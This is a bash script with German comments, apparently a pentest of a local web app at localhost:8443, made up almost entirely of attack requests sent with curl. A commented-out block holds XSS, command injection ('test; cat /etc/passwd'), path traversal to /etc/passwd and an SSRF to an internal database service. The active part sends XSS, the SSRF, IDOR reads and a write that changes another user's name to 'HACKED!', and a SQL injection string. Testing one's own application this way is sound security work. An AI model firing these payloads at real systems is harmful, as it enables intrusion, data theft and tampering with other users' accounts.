#!/bin/bash






# echo "=== PHASE 3: INPUT VALIDATION TESTING ==="

# # Test 1: XSS im Display Name
# echo "\n1️⃣ Testing XSS in profile..."
# curl -k -X PUT https://localhost:8443/api/user/profile \
#   -H "Content-Type: application/json" \
#   -b cookies.txt \
#   -d '{
#     "display_name": "<script>alert(\"XSS\")</script>"
#   }' | jq .

# # Test 2: Command Injection (wenn File Upload existiert)
# echo "\n2️⃣ Testing command injection..."
# curl -k -X POST https://localhost:8443/api/game/create \
#   -H "Content-Type: application/json" \
#   -b cookies.txt \
#   -d '{
#     "name": "test; cat /etc/passwd"
#   }' | jq .

# # Test 3: Path Traversal
# echo "\n3️⃣ Testing path traversal..."
# curl -k -X GET "https://localhost:8443/api/user/avatar?file=../../../etc/passwd" \
#   -b cookies.txt

# # Test 4: SSRF - DAS IST DER WICHTIGE!
# echo "\n4️⃣ Testing SSRF (Server-Side Request Forgery)..."
# curl -k -X POST https://localhost:8443/api/user/profile \
#   -H "Content-Type: application/json" \
#   -b cookies.txt \
#   -d '{
#     "avatar_url": "http://database-service:3006/internal/list?table=Users"
#   }' | jq .

# //----------------------------------------------------------------

echo "=== PHASE 3: TESTING REAL ENDPOINTS ==="

# Erst meine User-ID herausfinden
MY_ID=$(curl -k -s https://localhost:8443/users/me -b cookies.txt | jq -r '.id // .user.id // empty')

if [ -z "$MY_ID" ]; then
  echo "❌ Not logged in! Run attack-step2-corrected.sh first"
  exit 1
fi

echo "✅ Logged in as user ID: $MY_ID"

# Test 1: XSS in Display Name
echo "\n\n1️⃣ Testing XSS in display-name..."
curl -k -X PUT https://localhost:8443/users/$MY_ID/display-name \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{
    "displayName": "<script>alert(\"XSS\")</script>"
  }' -s | jq .

# Test 2: SSRF via Avatar Upload
echo "\n\n2️⃣ Testing SSRF via avatar upload..."
curl -k -X POST https://localhost:8443/users/$MY_ID/avatar \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{
    "avatarUrl": "http://database-service:3006/internal/list?table=Users"
  }' -s | jq .

# Test 3: IDOR - Versuche auf anderen User zuzugreifen
echo "\n\n3️⃣ Testing IDOR - Accessing other users..."
for user_id in 1 2 3 999; do
  echo "\n  Testing user ID: $user_id"
  curl -k -s https://localhost:8443/users/$user_id \
    -b cookies.txt | jq -c '{id, email, username}'
done

# Test 4: Ändere Display Name von anderem User
echo "\n\n4️⃣ Testing IDOR - Modifying other user's display name..."
curl -k -X PUT https://localhost:8443/users/1/display-name \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{
    "displayName": "HACKED!"
  }' -s | jq .

# Test 5: SQL Injection in Email Update
echo "\n\n5️⃣ Testing SQL Injection in email update..."
curl -k -X PUT https://localhost:8443/users/$MY_ID/update-email \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{
    "email": "hacker@test.com'\'' OR '\''1'\''='\''1"
  }' -s | jq .